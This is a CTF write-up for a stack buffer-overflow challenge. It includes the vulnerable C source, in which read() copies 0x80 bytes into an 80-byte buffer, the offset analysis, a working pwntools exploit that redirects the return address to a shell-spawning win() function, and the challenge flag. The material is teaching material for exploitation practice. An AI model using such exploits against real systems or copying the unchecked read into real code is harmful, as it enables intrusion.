## Checksum

Classic BOF to overwrite RET address.

<details>
<summary>Flag:</summary> 
`greyhats{ech0_aft3r_m3_aH_jkplsno_455a214}`
</details>

## Source code Analysis:

Code for `echo.c`:

```c
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

void setup()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void win() {
    system("/bin/sh");
}

int main() {
    setup();

    char message[80];

    while (true) {
        printf("> ");
        memset(message, 0, 80);
        read(0, message, 0x80);
        if (!strncmp(message, "q", 2) || !strncmp(message, "q\n", 3)) {
            return 0;
        }
        printf("< %s", message);
    }
}
```

Observations:

1. There is a buffer of size 80 declared with `char message[80]`.
2. There is a `read()` call that writes to `message` with `read(0, message, 0x80)`. However, note that `0x80` is more than 80 characters - it is in fact, 8*16 characters. This gives an additional 48 characters that can be written past the buffer, which may be long enough to overwrite the return address.
3. There is a `win()` function that can be called to get a shell.
4. The function only returns when `q\x00` or `q\x0a\x00` is present at the beginning of `message`. 

## Binary Analysis:

`checksec ./echo.bin` shows the only protection enabled is the NX bit. No canary or PIE is involved.

Based on the earlier observations from source code analysis, the following must be done:

1. Find the address of `win()`.
2. Find the required offset to overwrite the return pointer.

The address of `win()` can be easily obtained in `gdb`. The address for `win()` is at `\x40\x12\x1b`.

To find the required offset, `pwntools` can be used to generate a unique sequence using `cyclic(100, n=8)`. It is first necessary to write `q\x00` to `stdin`, followed by our buffer. 

![](img/echo%20set%20ret%20breakpoint.png)
![](img/echo%20cyclic%20find.png)

The offset needed after `q\x00` is 86 more characters.

## The attack

Write the `q\x00` character, and sufficient amount (86) characters to overflow the buffer and overwrite the return address with the address of `win()`.

Also, note that due to `MOVAPS` issue in `system()` calls, the `win()` addr may need to be changed. (`\x1b` to `\x23`)

Python code to execute attack:

```python
from pwn import *
import sys

if (len(sys.argv)!=3):
    print("Usage: exploit.py <ip> <portnum>")
    exit()

ip = sys.argv[1]
portnumber = sys.argv[2]
#nc 34.143.157.242 8050
sock = remote(ip, portnumber)

buffer = bytearray()
buffer += b"q\x00" #quit command to force return
buffer += ("A"*86).encode() #chars offset
buffer += b"\x23\x12\x40\x00\x00\x00\x00\x00" # win() addr in little endian
buffer = bytes(buffer)

sock.send(buffer)
sock.interactive()
```

<details>
<summary>Flag:</summary> 
`greyhats{ech0_aft3r_m3_aH_jkplsno_455a214}`
</details>

